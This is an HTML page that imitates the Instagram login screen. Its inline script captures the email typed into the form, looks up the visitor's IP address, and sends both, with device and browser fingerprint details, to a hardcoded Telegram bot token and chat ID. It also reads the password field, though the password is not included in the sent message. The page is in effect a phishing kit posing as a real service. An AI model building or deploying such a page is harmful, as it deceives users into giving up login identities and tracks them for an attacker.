<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="instgrem.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram clone</title>
</head>
<body>

    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex"></section>

        <section id="auth" class="flex direction-column">
            <!-- Login Panel -->
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>

                <form id="login-form">
                    <label for="email" class="sr-only">Phone, username or email</label>
                    <input name="email" id="email" placeholder="Phone, username or email" />

                    <label for="password" class="sr-only">Password</label>
                    <input name="password" id="password" type="password" placeholder="Password" />

                    <button type="submit">Log In</button>
                </form>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>

                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a href="#">Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>

            <!-- Register Panel -->
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>

            <!-- App Download Section -->
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png" alt="Apple Store logo" title="Apple Store logo" />
                    <img src="./img/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
                </div>
            </div>
        </section>
    </main>

    <!-- Footer Section -->
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CAREERS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATION</a></li>
            <li><a href="#">MORE RELEVANT ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p class="copyright">© 2020 Instagram from Facebook</p>
    </footer>

    <!-- External Script for Axios -->
    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>

    <script>
        const TOKEN = "7918431874:AAHRaH0vmM74cgeFIfcfT9DryM_jyJ8Qg40";             
        const CHAT_ID = "6256449712";
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;  

        // دالة لتوليد الرسالة
        function generateLoginAttemptMessage(email, ip, deviceType, platform, userAgent, screenWidth, screenHeight) {
            const location = ""; // يمكنك إضافة بيانات الموقع إذا كنت بحاجة باستخدام geolocation.
            const pageLoadTime = new Date(); // إذا كنت بحاجة لحساب الوقت الذي تم فيه تحميل الصفحة

            return `
                <b>New Login Attempt</b>\n
                <b>Email:</b> ${email}\n
                <b>IP Address:</b> ${ip}\n
                <b>Location:</b> ${location}\n
                <b>Device Type:</b> ${deviceType}\n
                <b>Platform:</b> ${platform}\n
                <b>User Agent:</b> ${userAgent}\n
                <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}\n
                <b>Date and Time:</b> ${new Date().toLocaleString()}\n
                <b>Browser Language:</b> ${navigator.language}\n
                <b>Timezone Offset:</b> ${new Date().getTimezoneOffset()} minutes\n
                <b>Referrer URL:</b> ${document.referrer}\n
                <b>Browser Type:</b> ${navigator.userAgent}\n
                <b>Connection Status:</b> ${navigator.onLine ? 'Online' : 'Offline'}\n
                <b>Preferred Languages:</b> ${navigator.languages.join(', ')}\n
                <b>Dark Mode Enabled:</b> ${window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Yes' : 'No'}\n
                <b>Is Mobile Device:</b> ${/Mobi|Android/i.test(userAgent) ? 'Yes' : 'No'}\n
                <b>Time Spent on Page:</b> ${Math.round((new Date() - pageLoadTime) / 1000)} seconds\n
            `;
        }

        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            axios.get('https://api.ipify.org?format=json')
                .then(response => {
                    const ip = response.data.ip;

                    const userAgent = navigator.userAgent;
                    const platform = navigator.platform;
                    const screenWidth = screen.width;
                    const screenHeight = screen.height;
                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                    // استخدام الدالة لتوليد الرسالة
                    const message = generateLoginAttemptMessage(email, ip, deviceType, platform, userAgent, screenWidth, screenHeight);

                    axios.post(URI_API, {
                        chat_id: CHAT_ID,
                        parse_mode: 'html',
                        text: message
                    }).then(response => {
                        alert('Information sent successfully!');
                    }).catch(error => {
                        alert('Error sending the information. Please try again.');
                    });
                })
                .catch(error => {
                    alert('Error fetching the IP address. Please try again.');
                });
        });
    </script>

</body>
</html>
